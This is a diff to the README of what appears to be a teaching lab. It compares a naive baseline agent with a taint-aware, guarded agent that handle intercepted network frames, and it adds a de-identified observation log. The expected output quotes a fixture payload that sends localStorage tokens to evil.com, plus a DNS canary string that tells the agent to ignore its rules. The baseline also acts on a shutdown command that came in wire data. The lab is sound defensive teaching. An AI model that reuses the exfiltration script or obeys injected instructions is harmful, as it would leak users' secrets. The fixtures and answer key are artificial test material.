@@ -58,10 +58,10 @@ Two fields in every frame are the **answer key**, not input: `injection` (what t
 python3 -m pytest tests/ -v
 ```
 
-**Expected:** `39 passed`. Notable: `test_detection_does_not_read_the_annotation` strips the answer key from every frame and asserts the verdicts do not change; `test_baseline_executes_from_wire_data_without_annotation` asserts the baseline's shutdown comes from the payload, not from a label; `test_agent_actually_consults_the_guard` swaps in a permissive guard and checks the agent follows it.
+**Expected:** `44 passed`. Notable: `test_detection_does_not_read_the_annotation` strips the answer key from every frame and asserts the verdicts do not change; `test_baseline_executes_from_wire_data_without_annotation` asserts the baseline's shutdown comes from the payload, not from a label; `test_agent_actually_consults_the_guard` swaps in a permissive guard and checks the agent follows it.
 
 ```
-============================== 39 passed in 0.XXs ==============================
+============================== 44 passed in 0.XXs ==============================
 ```
 
 ---
@@ -72,7 +72,7 @@ python3 -m pytest tests/ -v
 python3 student/interceptbound.py
 ```
 
-**What this does:** Runs 8 frames through **Baseline** (same parser and detectors, no scope, no taint, no guard — every candidate action is "executed") and **Taint-Aware** (scope → taint-labelled parse → ephemeral buffer → guard-gated actions), then prints frame_001's leaves with their labels, the provenance-rule probe, and the buffer statistics.
+**What this does:** Runs 8 frames through **Baseline** (same parser and detectors, no scope, no taint, no guard — every candidate action is "executed") and **Taint-Aware** (scope → observe/de-identify → taint-labelled parse → ephemeral buffer → guard-gated actions), then prints frame_001's leaves with their labels, the observation log each agent keeps, the provenance-rule probe, and the buffer statistics.
 
 **Expected — key lines, verbatim:**
 
@@ -105,6 +105,27 @@ python3 student/interceptbound.py
   frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
     ALLOWED: store_token [body]
 
+--- Observation log: what each agent writes down ---
+  Baseline (recorded in the clear):
+    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
+    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
+    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls 192.168.1.20:443 CN=api.internal.example
+    custom 192.168.1.30:9999 DATA_CHUNK_1
+    http 192.168.1.10:80 {"error": "unauthorized"}
+    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
+    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
+  Guarded (de-identified before recording):
+    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
+    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
+    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls HOST_ec1a:443 CN=api.internal.example
+    custom HOST_ff75:9999 DATA_CHUNK_1
+    http HOST_0272:80 {"error": "unauthorized"}
+    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
+  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
+  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
+
 --- Provenance rule: a laundered taint label still cannot store an intercepted token ---
   frame_001_relabelled_low (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint low):
     BLOCKED: store_token (intercepted_network_cannot_drive_privileged_action) [body]
@@ -116,6 +137,8 @@ Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evi
 ```
 
 **Record the three block reasons** that appear in the run — `taint_too_high`, `injection_detected`, `source_not_allowed` — plus the fourth from the provenance probe, `intercepted_network_cannot_drive_privileged_action`. Distinct reasons let an operator tell *which defense* fired. Also record what was **allowed**: observations from every in-scope frame, and one privileged action (`store_token` on `frame_008`) because its provenance is `trusted_local`.
+
+**The observation log** is Step 3's new section. It shows the one thing the guarded agent is *allowed* to keep — a compact note per in-scope frame — de-identified first. Between scope and taint (`scope → observe/de-identify → taint → guard`), each note passes through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms (`HOST_0272`, `USER_5aff`), the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes `EMAIL_e50e`, and tokens and passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — `192.168.1.10` is `HOST_0272` in frames 001, 002 and 006 — so records still join, and they are locally reversible with `agent.anon.reverse("HOST_0272")`. The baseline records the same notes in the clear, and because frame_007 is out of scope the guarded agent never observes it — only the baseline logs its user and forged token.
 
 ---
 
@@ -245,7 +268,7 @@ cat results/intercept_results.json
 | Python version | | `python3 --version` |
 | OS | | `uname -a` / `systeminfo` |
 | Commands used | | copy from Steps 2–7 |
-| Tests passed | | `39 passed` |
+| Tests passed | | `44 passed` |
 | Baseline: frame_005 action | | `execute_shutdown` (allowed) |
 | Defended: frame_001 disposition | | `store_token` blocked (`taint_too_high: high > low`), `record_observation` allowed |
 | Defended: frame_008 disposition | | `store_token` allowed (`trusted_local`) |
@@ -278,7 +301,7 @@ From the **repository root**: `make demo DEMO=09`
 
 | Symptom | Cause | Fix |
 |---------|-------|-----|
-| `39 passed` fails after edits | Exercise changes | `git checkout -- student/ fixtures/ tests/` |
+| `44 passed` fails after edits | Exercise changes | `git checkout -- student/ fixtures/ tests/` |
 | `FileNotFoundError: … fixtures/traffic.json` | Fixture missing or renamed | paths are resolved relative to the script, so the working directory does not matter; restore with `git checkout -- fixtures/` |
 | Generator exits 1 with `MISMATCH against fixture expectations` | Code or fixture edited | the `expected` block is the answer key; update it deliberately or revert |
 | `source_not_allowed` on a frame you added | Source IP not in `allowed_sources` | add the host (without port) to the scope policy |
